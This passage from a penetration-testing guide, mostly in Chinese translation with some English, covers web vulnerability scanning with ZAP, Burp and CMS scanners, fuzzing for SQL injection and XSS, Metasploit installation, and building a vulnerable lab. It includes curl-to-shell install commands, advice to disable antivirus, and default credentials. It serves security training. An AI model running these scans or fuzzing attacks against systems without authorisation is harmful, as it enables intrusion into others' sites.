  \n一旦单击 **Start Scan**，**Active Scan** 选项卡将获得焦点，扫描进度和请求日志将显示在其中：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_343_1.png)\n\
  \n扫描结果将记录在 Alerts 选项卡中：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_344_0.png)\n\
  \n此外，使用主菜单中的 Report，您可以将结果导出为 HTML、XML、Markdown 或 JSON 等多种格式。下面的屏幕截图显示了 HTML 报告的示例：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_344_1.png)\n\nOWASP-ZAP 也按风险等级对扫描结果进行排序，并包含发现问题的详细描述、使用的有效载荷、解决方案建议和参考。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_345_0.png)\n\nBurp Suite 在其专业版中也具有主动扫描器，可提供非常准确的结果且误报率低。\n\
  \n## Content Management Systems scanners\n\n内容管理系统（CMSs），如 WordPress、Joomla 或 Drupal，是用于在无需编程或只需少量编程的情况下创建网站的框架。它们集成第三方插件以简化登录和会话管理、搜索等任务，甚至包含完整的购物车模块。\n\
  \n因此，CMSs 不仅在其自身代码中存在漏洞，也存在于其包含的插件中。后者不受一致的质量控制，且通常由独立程序员在业余时间制作，按其自己的时间表发布更新和补丁。\n\
  \n因此，我们现在将介绍一些最受欢迎的 CMS 漏洞扫描器。\n\n## WPScan\n\nWPScan 顾名思义，是专注于 WordPress CMS 的漏洞扫描器。它会识别\
  \ WordPress 的版本号以及已安装插件的版本号，然后将其与已知漏洞数据库进行匹配，以识别可能的 安全风险。\n\n下面的屏幕截图显示了 WPScan 的基本用法，只需将目标\
  \ URL 作为参数添加即可：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_346_0.png)\n\n首次运行时，您可能需要使用\
  \ `-update` 选项更新数据库。\n\n## JoomScan\n\nJoomScan 是 Kali Linux 中包含的 Joomla 站点漏洞扫描器。要使用它，您只需添加\
  \ -u 选项，后跟站点的 URL，如下所示：\n\n```\njoomscan -u http://10.7.7.5/joomla\n```\n\nJoomScan\
  \ 首先尝试通过检测 Joomla 版本和插件来指纹识别服务器，如下图所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_347_0.png)\n\
  \n之后，JoomScan 将显示与检测到的配置或已安装插件相关的漏洞：\n\n```\nVulnerabilities Discovered\n=======================\n\
  \n# 1\nInfo -> Generic: htaccess.txt has not been renamed.\nVersions Affected: Any\n\
  Check: /htaccess.txt\nExploit: Generic defenses implemented in .htaccess are not\
  \ available, succeed.\nVulnerable? Yes\n\n# 2\nInfo -> Generic: Unprotected Administrator\
  \ directory\nVersions Affected: Any\nCheck: /administrator/\nExploit: The default\
  \ /administrator directory is detected. Attackers counts. Read: http://yehg.net/lab/pr0js/view.php/MULTIPLE%20TRICKY%20W\n\
  Vulnerable? Yes\n\n# 3\nInfo -> Core: Multiple XSS/CSRF Vulnerability\nVersions\
  \ Affected: 1.5.9 <=\nCheck: /?1.5.9-x\nExploit: A series of XSS and CSRF faults\
  \ exist in the administrator ap\ntor components include com_admin, com_media, com_search.\
  \ Both com_ad\nvulnerabilities, and com_media contains 2 CSRF vulnerabilities.\n\
  Vulnerable? No\n\n# 4\nInfo -> Core: JSession SSI Session Disclosure Vulnerability\n\
  ```\n\n## CMSmap\n\nCMSmap 未包含在 Kali Linux 中，但可以从其 Git 仓库轻松安装，如下所示：\n\n```\ngit\
  \ clone https://github.com/Dionach/CMSmap.git\n```\n\n\n\n\nCMSmap 扫描 WordPress、Joomla\
  \ 或 Drupal 站点的漏洞。它具有自动检测站点所使用 CMS 的能力。它是一个命令行工具，你需要使用 -t 选项来指定目标站点。CMSmap 显示它找到的漏洞，并在前面加上它确定的严重性评级的指示符：[I]\
  \ 表示信息性，[L] 表示低，[M] 表示中等，[H] 表示高，如以下屏幕截图所示：\n\n```\nroot@kali:~/CMSmap# ./cmsmap.py\
  \ -t http://10.7.7.5/wordpress/ --noedb\n[-] Date & Time: 11/02/2018 11:41:37\n\
  [-] Target: http://10.7.7.5/wordpress\n[M] Website Not in HTTPS: http://10.7.7.5/wordpress\n\
  [I] Server: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 mod_python/3.3.1\
  \ Python/2.6.5 mod_ssl/2.2.14 OpenSSL/0.9.8k Phusion\n/V5.10.1\nX-Powered-By: PHP/5.3.2-1ubuntu4.30\n\
  [L] X-Frame-Options: Not Enforced\nStrict-Transport-Security: Not Enforced\n[I]\
  \ X-Content-Security-Policy: Not Enforced\nX-Content-Type-Options: Not Enforced\n\
  [L] No Robots.txt Found\nCMS Detection: Wordpress\n[H] Configuration File Found:\
  \ http://10.7.7.5/wordpress/wp-config\n[-] Enumerating Wordpress Usernames via \"\
  Feed\" ...\n[-] Enumerating Wordpress Usernames via \"Author\" ...\n[I] Autocomplete\
  \ Off Not Found: http://10.7.7.5/wordpress/wp-login.php\n[-] Default WordPress Files:\n\
  [I] http://10.7.7.5/wordpress/readme.html\n[I] http://10.7.7.5/wordpress/license.txt\n\
  [I] http://10.7.7.5/wordpress/xmlrpc.php\n[I] http://10.7.7.5/wordpress/wp-config-sample.php\n\
  [I] http://10.7.7.5/wordpress/wp-includes/js/tinymce/license.txt\n[-] Searching\
  \ Wordpress Plugins ...\nakismet\nwp-db-backup\n```\n\n屏幕截图所示使用的 --noedb 选项可防止 WordPress\
  \ 在 Exploit Database（https://www.exploit-db.com/）中查找已识别漏洞的利用，因为我们的 Kali Linux 虚拟机未连接到互联网。尝试连接外部服务器将导致错误并延迟获取结果。\n\
  \n## Fuzzing web applications\n\n**Fuzzing** 是一种测试机制，它通过软件实现的常规输入向其发送特制（或随机，取决于\
  \ fuzzing 类型）的数据。实现可能是一个 Web 应用程序、厚客户端或在服务器上运行的进程。它是一种黑盒测试技术，以自动方式注入数据。虽然 fuzzing\
  \ 主要用于安全测试，但也可以用于功能测试。\n\n从前面的定义中，人们可能会认为 fuzzing 与任何漏洞扫描都相同。是的，fuzzing 是漏洞扫描过程的一部分，该过程还可能涉及\
  \ Web 应用程序的指纹识别和爬取以及对响应的分析，以确定是否存在漏洞。\n\n有时，我们需要将 fuzzing 部分从扫描过程中分离出来单独执行，这样测试输入的确定和测试结果的分析就由我们而不是扫描器来完成。这样，我们就可以更精细地控制向服务器发送哪些测试值到哪些参数。\n\
  \n## Using the OWASP-ZAP fuzzer\n\nOWASP-ZAP fuzzer 可以从站点地图、代理的历史记录或请求面板运行，通过右键单击你想要\
  \ fuzz 的请求并选择 Attack | Fuzz...，如以下屏幕截图所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_350_0.png)\n\
  \n这样做之后，fuzzing 对话框会出现，你可以在其中选择插入点；即请求中你想要尝试不同值以分析服务器响应的部分。在以下示例中，我们正在从 OWASP BWA\
  \ 易受攻击的虚拟机中选择 BodgeIt's 搜索中的 q 参数的值：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_351_0.png)\n\
  \n请注意，已经添加了两个负载列表。要做到这一点，选择你想要 fuzz 的文本，在本例中为 q 的值，然后在右侧单击 Add...（在 Fuzz Locations\
  \ 选项卡中），以使 Payloads 对话框出现。然后在该对话框中单击 Add...。你将从文件 /usr/share/wfuzz/wordlist/injections/SQL.txt\
  \ 中获取第一个负载列表。\n\n该文件包含 fuzzing 字符串，可帮助识别 SQL 注入漏洞。在负载类型中选择 File，单击 Select...，并浏览到该文件以加载它，如以下屏幕截图所示。然后单击\
  \ Add 以将该列表添加到 fuzzer：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_352_0.png)\n\n\
  接下来，使用第二个负载来测试 XSS。这次你将使用 File Fuzzers 作为类型。这是一组 OWASP-ZAP 开箱即用的 fuzzing 字符串。从这些\
  \ fuzzer 中，选择来自 JbroFuzz | XSS 的一些 XSS 列表：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_353_0.png)\n\
  \n可在 OWASP-ZAP 中使用的 fuzzing 字符串的其他选项如下：\n\n- **Empty/Null**：此选项提交原始值（无更改）\n- **Numberzz**：此选项生成一系列数字，允许你定义起始值、结束值和增量\n\
  - **Regex**：此选项生成与给定正则表达式匹配的指定数量的字符串\n- **Script**：此选项让你可以使用脚本（从 Tools | Options...\
  \ | Scripts 加载）来生成负载\n- **Strings**：此选项显示一个简单的字符串列表，手动提供\n\n一旦选择了所有插入点及其对应的 fuzzing\
  \ 输入，你就可以通过单击 **Start Fuzzer** 启动 fuzzer。然后 **Fuzzer** 选项卡将出现在底部面板中。\n\n在下一个屏幕截图中，你可以看到\
  \ fuzzing 结果。**State** 列显示工具做出的初步诊断，表明此类请求导致可利用漏洞的可能性有多大。请注意示例中的 **Reflected** 这个词。这意味着\
  \ fuzzer 发送的字符串已作为响应的一部分由服务器返回。我们知道这是一个 XSS 的字符串指示符：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_354_0.png)\n\
  \n为了进一步探索从 Fuzzer 选项卡中显示的结果中发现可利用漏洞的可能性，你可以选择任何请求及其标头和正文。相应的响应将在中央面板的相关部分中显示。响应将显示可疑字符串高亮显示。这样，你可以一眼看出是否存在漏洞，以及该特定测试用例是否值得进一步深入研究。如果是这样，你可以右键单击请求并选择\
  \ Open/Resend with Request Editor 以启动 Request Editor 并操作和重新发送请求。\n\n进一步调查你认为可能导致利用的请求的另一种选择是在浏览器中重放请求，以便你可以查看其行为以及服务器如何响应。要做到这一点，右键单击请求，选择\
  \ Open URL In Browser，然后选择你喜欢的浏览器。这将打开浏览器并使其提交所选请求：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_355_0.png)\n\
  \n## Burp Intruder\n\n你已经在之前的章节中使用 Intruder 执行了各种任务，并且了解其功能和灵活性。现在我们将使用它来 fuzz BodgeIt\
  \ 登录页面以查找 SQL 注入漏洞。你需要做的第一件事是从代理历史记录中将一个有效的登录请求发送到 Intruder。这是通过右键单击请求并选择 Send to\
  \ Intruder 完成的。\n\n进入 Intruder 后，你将清除所有插入点并在用户名值中添加一个，如以下屏幕截图所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_356_0.png)\n\
  \n下一步是设置负载。为此，转到 Payloads 选项卡，单击 Load... 加载文件，并转到 /usr/share/wfuzz/wordlist/injections/SQL.txt：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_357_0.png)\n\n接下来，为了更轻松地识别有趣的请求，你将添加一些匹配规则，以便你可以从攻击对话框中知道何时请求导致错误或包含有趣的词。将以下术语添加到\
  \ Options 中的 Grep - Match 部分：\n\n- `error`：添加此项在你想要知道何时输入触发错误时很有用，因为基本的 SQL 注入在更改查询语法时会显示错误消息\n\
  - `SQL`：如果错误消息不包含单词 error，你希望知道何时输入触发包含单词 SQL 的响应\n- `table`：添加此项当你期望读取包含表名的 SQL\
  \ 详细错误消息时\n- `select`：添加此项以防披露 SQL 语句\n\n\n\n\n\n前面的术语列表绝不是用于响应匹配的最佳列表。它仅用于演示目的。在实际场景中，首先需要手动分析应用程序实际给出的响应，然后再选择与该上下文和所寻找的漏洞相匹配的术语。以下截图显示了示例匹配列表的外观：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_358_0.png)\n\n一旦配置了所有攻击参数，您就可以开始攻击了。错误开始匹配并不需要花费太多时间。你可以看到表被每个响应匹配，所以这不是一个好的选择。SQL\
  \ 和 select 没有匹配，至少在最初的响应中没有。如果你选择其中一个已检查错误的响应，你会看到页面顶部有一条消息 System error.，这似乎是在负载包含单引号时触发的。\n\
  \n这可能是 SQL 注入的指标，值得再深入挖掘一下：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_359_0.png)\n\
  \n要查看此请求如果在 Burp Suite 的任何组件中的每个请求或响应中从浏览器执行时会如何表现，可以右键单击并选择 **Request in browser**。你可以选择是否想要原始会话（发送请求的会话\
  \ cookie）或当前会话（浏览器当前拥有的会话 cookie）：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_360_0.png)\n\
  \n当你从 Burp Suite 向浏览器发送请求时，你会得到一个以 http://burp/repeat/ 开头的 URL，需要将其复制并粘贴到你想要重放请求的浏览器中。Burp\
  \ Suite 不会像 ZAP 那样启动浏览器：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_361_0.png)\n\
  \n以下截图显示了示例请求在浏览器中的外观。它绝对看起来 System error. 消息不应该在那里，你应该更深入地研究该请求并手动尝试变体以获得 SQL 注入：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_361_1.png)\n\n## Post-scanning actions\n\
  \n不幸的是，提供渗透测试服务的公司最终只进行漏洞扫描并在没有手动测试阶段的情况下定制和调整其报告，而不验证扫描器发现的所谓漏洞是否确实是漏洞的情况比应有的更常见。不仅这对客户没有任何价值，因为他们自己就可以下载漏洞扫描器并对其应用程序运行扫描，而且它还损害了公司对安全服务和安全公司的看法，使得提供优质服务的公司更难以有竞争力的价格在市场上推广这些服务。\n\
  \n扫描器生成扫描报告后，你不能仅仅拿着该报告就说你发现了 X 和 Y 漏洞。因为扫描器总是会产生误报（即报告不存在的漏洞）和漏报（例如扫描器遗漏的漏洞），因此必须进行手动测试，以便你能够找到和报告自动化工具未涵盖的漏洞，例如授权问题或业务逻辑绕过或滥用等，同时验证扫描器报告的所有发现是否确实是漏洞。\n\
  \n## 10\n### Metasploit Quick Tips for Security Professionals\n\n在本章中，我们将涵盖以下配方：\n\
  \n- Installing Metasploit on Windows\n- Installing Linux and macOS\n- Installing\
  \ Metasploit on macOS\n- Using Metasploit in Kali Linux\n- Setting up a penetration\
  \ testing lab using VMware\n- Setting up SSH connectivity\n- Connecting to Kali\
  \ using SSH\n- Configuring Metasploit to use PostgreSQL\n- Creating workspaces\n\
  - Using the database\n- Using the `hosts` command\n- Understanding the `services`\
  \ command\n\n## Introduction\n\nMetasploit 目前是世界上领先的渗透测试工具，也是信息安全和渗透测试领域最大的开源项目之一。它彻底改变了我们执行系统安全测试的方式。Metasploit\
  \ 如此受欢迎的原因是它可以执行广泛的任务来简化渗透测试工作，使系统更安全。Metasploit 可用于所有流行的操作系统。框架的工作流程对所有操作系统几乎相同。在本书中，我们将主要在\
  \ Kali Linux 上工作，因为它预装了 Metasploit Framework 和其他在框架上运行的第三方工具。\n\n让我们快速介绍一下框架及其相关的各种术语：\n\
  \n- **Metasploit Framework**：这是一个由 H. D. Moore 于 2003 年启动的免费开源渗透测试框架，后来被 Rapid7\
  \ 收购。框架的当前稳定版本使用 Ruby 语言编写。它拥有世界上最大的经过测试的漏洞利用数据库，每年收到超过一百万次下载。它也是迄今为止用 Ruby 构建的最复杂的项目之一。\n\
  - **Vulnerability**：这是允许攻击者/渗透测试人员入侵或破坏系统安全的弱点。此弱点可能存在于操作系统、应用程序软件，甚至网络协议中。\n- **Exploit**：漏洞利用是一段允许攻击者/测试人员利用易受攻击的系统并破坏其安全的代码。每个漏洞都有其对应的漏洞利用。Metasploit\
  \ 有超过 1,700 个漏洞利用。\n- **Payload**：这是实际执行工作的代码。它在被利用后在系统上运行。它主要用于在攻击机器和受害机器之间建立连接。Metasploit\
  \ 有超过 500 个有效载荷。\n- **Module**：模块是完整系统的微小构建块。每个模块执行特定任务，完整系统通过组合多个模块作为单一单元运行。这种架构的最大优势是，开发人员可以轻松地将新的漏洞利用代码和工具集成到框架中。\n\
  \nMetasploit Framework 具有模块化架构，漏洞利用、payload、编码器等被视为独立的模块：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_365_0.png)\n\
  \n让我们仔细检查架构图。\n\nMetasploit 使用不同的库来确保框架的正常运行。这些库是一组可被框架的不同模块利用的预定义任务、操作和函数。框架最基本的部分是\
  \ Ruby 扩展（Rex）库。Rex 提供的一些组件包括包装套接字子系统、协议客户端和服务器的实现、日志子系统、漏洞利用实用程序类以及许多其他有用的类。Rex\
  \ 本身的设计没有依赖项，除了随默认 Ruby 安装一起提供的依赖项之外。\n\n然后我们有扩展 Rex 的 MSF Core 库。Core 负责实现允许与漏洞利用模块、会话和插件交互所需的所有接口。该核心库由框架基础库扩展，该库旨在为处理框架核心提供更简单的包装例程，以及提供用于处理框架不同方面的实用程序类，例如将模块状态序列化为不同的输出格式。最后，基础库由框架的用户界面（UI）扩展，该界面实现了对框架本身的不同类型的\
  \ UI 的支持，例如命令控制台和 Web 界面。\n\n框架提供了两种不同的 UI，即 msfconsole 和 Web 界面。强烈建议查看这两个界面，但在本书中，我们将主要在\
  \ msfconsole 界面上工作。这是因为 msfconsole 为框架提供了最佳支持，利用了所有功能。\n\n\n\n\n\nThe msfconsole\
  \ interface is by far the most talked-about part of the Metasploit Framework, and\
  \ for good reason, as it is one of the most flexible, character-rich, and well-supported\
  \ tools within the framework. It actually provides a handy all-in-one interface\
  \ for every choice and setting attainable in the framework; it’s like a one-stop\
  \ shop for all of your pen-testing dreams. We can use msfconsole to do anything,\
  \ including launching an exploit, loading an auxiliary, executing enumeration, producing\
  \ listeners, or executing mass exploitations in contrast to an entire network.\n\
  \nA web interface is available for you to work with Metasploit Community, Express,\
  \ and Pro. To launch the web interface, open a web browser and go to https://localhost:3790.\n\
  \nTo see the operating systems that are currently supported and the minimum system\
  \ requirements, please visit https://www.rapid7.com/products/metasploit/system-requirements.\n\
  \n## Installing Metasploit on Windows\n\nInstallation of the Metasploit Framework\
  \ on Windows is simple and requires almost no effort. The framework installer can\
  \ be downloaded from the Metasploit official website (http://www.metasploit.com/download).\
  \ In this recipe, we will learn how to configure Metasploit on Windows.\n\n## Getting\
  \ ready\n\nYou will notice that there are four editions of Metasploit available:\n\
  \n- **Pro**: For penetration testers and IT security teams\n- **Express**: For IT\
  \ generalists at SMBs\n- **Community**: For small companies and students\n- **Framework**:\
  \ For developers and security researchers\n\nTo follow along with this book, it\
  \ is recommended to download the latest framework edition of Metasploit (https://windows.metasploit.com/metasploitframework-latest.msi),\
  \ which contains the console and all other relevant dependencies.\n\n## How to do\
  \ it...\n\nOnce you have completed downloading the installer, simply run it and\
  \ sit back. It will automatically install all the relevant components. Once the\
  \ installation is complete, you can access the framework through various shortcuts\
  \ created by the installer:\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_367_0.png)\n\
  \nWhile installing Metasploit on Windows, you should disable the antivirus protection,\
  \ as it may detect some of the installation files as potential viruses or threats\
  \ and can block the installation process. Once the installation is complete, make\
  \ sure that you have white-listed the framework installation directory in your antivirus\
  \ software, as it will detect the exploits and payloads as malicious.\n\n## Installing\
  \ Linux and macOS\n\nThe quick installation script will import the Rapid7 signing\
  \ key and set up the package for all supported Linux and macOS systems:\n\n```\n\
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb\
  \ > msfinstall && chmod 755 msfinstall && ./msfinstall\n```\n\nThe packages will\
  \ integrate into the OS's native package management and can either be updated with\
  \ the msfupdate command or by using your preferred package manager.\n\n## How to\
  \ do it...\n\nThe full installation process is as follows:\n\n```\n# curl\nhttps://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb\
  \ > msfinstall && \\\n> chmod 755 msfinstall && \\\n> ./msfinstall\n  % Total %\
  \ Received % Xferd Average Speed Time Time Time Current\n                      \
  \       Dload Upload Total Spent Left Speed\n100 5394 100 5394 0 0 17618 0 --:--:--\
  \ --:--:-- --:--:-- 17627\nUpdating package cache..OK\nChecking for and installing\
  \ update..\nReading package lists... Done\nBuilding dependency tree\nReading state\
  \ information... Done\nThe following NEW packages will be installed:\nmetasploit-framework\n\
  ...\nRun msfconsole to get started\nW: --force-yes is deprecated, use one of the\
  \ options starting with --allow instead.\n# msfconsole\n# cowsay++\n-----------------\n\
  < metasploit >\n-----------------\n      \\    '.__'\n       \\  (oo)____\n    \
  \      (__)    )\\\n              ||--|| *\n...\nmsf >\n```\n\n## Installing Metasploit\
  \ on macOS\n\nThe latest macOS installer package is available at https://osx.metasploit.com/metasploitframework-latest.pkg.\n\
  \n## How to do it...\n\nDownload and launch the installer to install Metasploit\
  \ Framework with all of its dependencies. Once installed, you can launch `msfconsole`\
  \ as `/opt/metasploit-framework/bin/msfconsole`:\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_369_0.png)\n\
  \nThe Metasploit Framework initial setup will help you set up a database and add\
  \ Metasploit to your local PATH as shown:\n\n```\n$ /opt/metasploit-framework/bin/msfconsole\n\
  \n** Welcome to Metasploit Framework Initial Setup **\n  Please answer a few questions\
  \ to get started.\n\nWould you like to add msfconsole and other programs to your\
  \ default PATH? yes\nYou may need to start a new terminal or log in again for this\
  \ to take effect.\n\nWould you like to use and setup a new database (recommended)?\
  \ yes\nCreating database at /Users/user/.msf4/db\nStarting database at /Users/user/.msf4/db...success\n\
  Creating database users\nCreating initial database schema\n\n** Metasploit Framework\
  \ Initial Setup Complete *\n```\n\n## Using Metasploit in Kali Linux\n\nKali Linux\
  \ is the most popular operating system for security professionals for two reasons.\
  \ First, it has all the popular penetration-testing tools preinstalled in it, so\
  \ it reduces the cost of a separate installation. Secondly, it is a Linux-based\
  \ operating system, which makes it less prone to virus attacks and provides more\
  \ stability during penetration testing. It saves you time as you don’t have to install\
  \ the relevant components and tools, and who knows when you may encounter an unknown\
  \ error during the installation process.\n\n## Getting ready\n\nEither you can have\
  \ a separate installation of Kali Linux on your hard disk, or you can also use it\
  \ over a host on a virtual machine. The installation process is simple and the same\
  \ as installing any Linux-based operating system.\n\nTo set up a Metasploit development\
  \ environment on Kali Linux or any Debian-based Linux environment, you can use the\
  \ following commands:\n\n```\nsudo apt update\nsudo apt -y install autoconf bison\
  \ build-essential curl git-core libapr1 libaprutil1 libcurl4-openssl-dev libgmp3-dev\
  \ libpcap-dev libpq-dev libreadline6-dev libsqlite3-dev libssl-dev libsvn1 libtool\
  \ libxml2 libxml2-dev libxslt-dev libyaml-dev locate ncurses-dev openssl postgresql\
  \ postgresql-contrib wget xslt zlib1g zlib1g-dev\ncurl -sSL https://rvm.io/mpapis.asc\
  \ | gpg --import -\ncurl -L https://get.rvm.io | bash -s stable\nsource ~/.rvm/scripts/rvm\n\
  cd /opt\nsudo git clone https://github.com/rapid7/metasploit-framework.git\nsudo\
  \ chown -R `whoami` /opt/metasploit-framework\ncd metasploit-framework\nrvm --install\
  \ $(cat .ruby-version)\ngem install bundler\nbundle install\n```\n\n## How to do\
  \ it...\n\nYou can download Kali Linux ISO images from the official site, https://www.kali.org/downloads/,\
  \ create a bootable USB drive, or burn the ISO image to a DVD-ROM and use it to\
  \ install Kali Linux as a separate OS on your hard disk or simply boot the Kali\
  \ ISO image in Live Mode. Another way is to run Kali Linux inside a virtual machine;\
  \ for that, you can either use the ISO image to install Kali Linux from scratch\
  \ or just download a Kali Linux VMware, VirtualBox, or ARM image from the official\
  \ site.\n\nFor this book, we will use a Kali Linux VMware virtual machine:\n\n1.\
  \ When booting the Kali Linux virtual machine, you will be asked to enter the username\
  \ and password. The default username for the root user is root and the password\
  \ is toor.\n2. Upon successful login, the easiest way to get the Metasploit Framework\
  \ up and running is to start Metasploit from the Applications menu.\n\n3. To launch\
  \ Metasploit from the Applications menu, go to Applications | Exploitation Tools\
  \ | metasploit framework, as shown in the following screenshot:\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_372_0.png)\n\
  \nStarting Metasploit Framework from the Applications menu will automatically set\
  \ up the PostgreSQL database. It will create the database user, the msf and msf_test\
  \ databases, configure Metasploit to use the database, create the database schema,\
  \ and start msfconsole by running the following command:\n\n```\nservice postgresql\
  \ start && msfdb init && msfconsole.\n```\n\n```\nCreating database user 'msf'\n\
  Enter password for new role:\nEnter it again:\nCreating databases 'msf' and 'msf_test'\n\
  Creating configuration file in /usr/share/metasploit-framework/config/database.yml\n\
  ```\n\n\n创建初始数据库架构\n# cowsay++\n< metasploit >\n-------------\n    \\  '.__'\n \
  \    \\ (oo)____\n        (__)   )\\ \n            ||--|| *\n\n    =[ metasploit\
  \ v4.16.8-dev- ]\n+ -- --=[ 1683 exploits - 964 auxiliary - 299 post ]\n+ -- --=[\
  \ 498 payloads - 40 encoders - 10 nops ]\n+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp\
  \ ]\n\nmsf >\n\n## 还有更多...\n\n另外，你也可以通过在终端窗口中输入 msfconsole 来启动 Metasploit Framework。\n\
  \n## 升级 Kali Linux\n\n作为一个滚动发行版，升级 Kali Linux 很简单。建议定期升级 Kali Linux，以确保你能获得最新的安全更新。要升级，请使用\
  \ apt update 然后 apt upgrade；apt 会查找可以升级而无需删除任何软件包的已安装软件包，这样是最不具侵入性的方式。\n\n对于主要版本升级和重要升级，请使用\
  \ apt full-upgrade；这将执行完整升级，并在必要时删除过时的软件包或安装新的依赖项。\n\n## 设置渗透测试实验室\n\n创建渗透测试实验室至关重要，它将允许你在安全环境中练习和测试新的技术和漏洞利用。使用虚拟机作为实验室环境将为你提供可移植性、灵活性和低维护性。你可以同时在多个操作系统上工作，设置复杂的网络场景，并在多个目标上执行渗透测试。因此，让我们快速了解一下如何使用虚拟化设置渗透测试实验室。\n\
  \n### 准备工作\n\n对于你的实验室，你可以使用你选择的 hypervisor；最常见的 hypervisor 是 VirtualBox、VMware Workstation\
  \ Pro、VMware Fusion Pro（适用于 Mac）、VMware ESXi 和 Microsoft Hyper-V。对于本书中使用的渗透测试实验室，我建议你使用\
  \ VirtualBox，因为它是一个开源 hypervisor，并且是构建其中一个虚拟机的要求。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_374_0.png)\n\
  \n虽然你需要使用 VirtualBox 构建虚拟机，但在构建机器后你可以将其导入到你喜欢的任何 hypervisor。\n\n这是渗透测试实验室的网络图：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_374_1.png)\n\n我们将使用四台虚拟机，分别是 Kali Linux、Linux\
  \ 服务器、Windows 服务器和 Windows 10 客户端。在这个实验室中，我们有一个现代场景，这将允许我们测试和练习最新的技术和漏洞利用。\n\n###\
  \ 如何操作...\n\n对于 Kali Linux 机器、Linux 服务器和 Windows 10 客户端，设置很简单。我们可以从官方网站 https://www.kali.org/downloads/\
  \ 下载 Kali Linux 虚拟机；对于 Linux 服务器，我们将使用 Metasploitable 2 机器，你可以从 SourceForge 下载 https://sourceforge.net/projects/metasploitable/files/Metasploitable2/；对于\
  \ Windows 10 客户端，我们可以从 Microsoft Developer 网站 https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/\
  \ 下载 90 天试用版。\n\n对于最后一台机器，我们将使用 Metasploitable 3，这是一个我们将构建的 Windows 虚拟机，其中包含许多安全漏洞供我们测试。要构建\
  \ Metasploitable 3 机器，我们必须安装 Packer、Vagrant、Vagrant Reload 插件和 VirtualBox。构建脚本和文档以及最新的构建说明可以在官方\
  \ GitHub 仓库找到：https://github.com/rapid7/metasploitable3。要自动构建机器，请执行以下步骤：\n\n- 1.\
  \ 如果使用 Bash，请运行 `build_win2008.sh` 脚本，如果使用 Windows，请运行 `build_win2008.ps1`。\n- 2.\
  \ 成功完成后，运行 `vagrant up`。\n- 3. 进程完成后，你应该能够在 VirtualBox 中打开 VM 并使用用户名 `vagrant` 和密码\
  \ `vagrant` 登录。\n\n在启动虚拟机之前，有一个重要的配置你必须进行，以便为实验室设置网络通信：\n\n- 1. 选择 Kali Linux 虚拟机并点击\
  \ **Settings**。然后，移动到 **Removable Devices**。在 **Network Adapter** 选项中，网络适配器应配置为使用\
  \ **Internet Sharing | Share with my Mac**，这将允许虚拟机访问互联网，共享主机机器的 IP 地址，因为它将为虚拟机到网络的流量提供\
  \ **Network Address Translation (NAT)**。\n\n2. Metasploitable 3 虚拟机的网络适配器和 Metasploitable\
  \ 2 虚拟机的第一个网络适配器也应配置为使用 NAT：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_376_0.png)\n\
  \n3. 在 VMware Fusion 中，转到 Preferences，选择 Network 选项卡，并创建一个自定义网络。选中通过 DHCP 在此网络上提供地址的框；使用\
  \ Subnet IP 为 10.0.0.0 和 Subnet Mask 为 255.255.255.0：\n\n## Network\n\n- Internet\
  \ Sharing\n- Share with my Mac\n- Bridged Networking\n- Autodetect\n- Wi-Fi\n- Bluetooth\
  \ PAN\n- Custom\n- Private to my Mac\n- vmnet2\n\n使用此配置的虚拟机将使用自定义网络连接。\n\n☑ Allow\
  \ virtual machines on this network to connect to external networks (using NAT)\n\
  \n☐ Enable IPv6\nIPv6 Prefix: fd15:4ba5:5a2b:1002::/64\n\n## Port Forwarding\n\n\
  | Host Port | Type | VM IP Address | Description |\n|---|---|---|---|\n\n☑ Connect\
  \ the host Mac to this network\n☑ Provide addresses on this network via DHCP\n\n\
  Subnet IP: 10.0.0.0\nSubnet Mask: 255.255.255.0\n\n☑ Require authentication to enter\
  \ promiscuous mode\nClick the lock to prevent further changes.\n\nGeneral  Keyboard\
  \ & Mouse  Display  Default Applications  Network  Feedback\n\n4. 现在你已经创建了自定义网络，选择\
  \ Windows 10 虚拟机，点击 Settings，然后进入 Network Adapter 设置。选择 Custom network 并选择我们创建的自定义网络。对\
  \ Metasploitable 2 虚拟机的第二个 Network Adapter 重复此过程：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_378_0.png)\n\
  \n5. 要验证配置，请登录到 Metasploitable 2 机器并使用 ip a 命令。root 用户的默认用户名为 msfadmin，密码为 msfadmin：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_378_1.png)\n\n### 它是如何工作的...\n\n通过创建两个\
  \ NAT 网络，我们可以使用第一个 NAT 网络模拟面向互联网的服务器，并使用我们创建的自定义网络作为内部机器，从而提供更真实的场景，并让你有机会学习如何进行内部目标的侦察、枢轴和横向移动。\n\
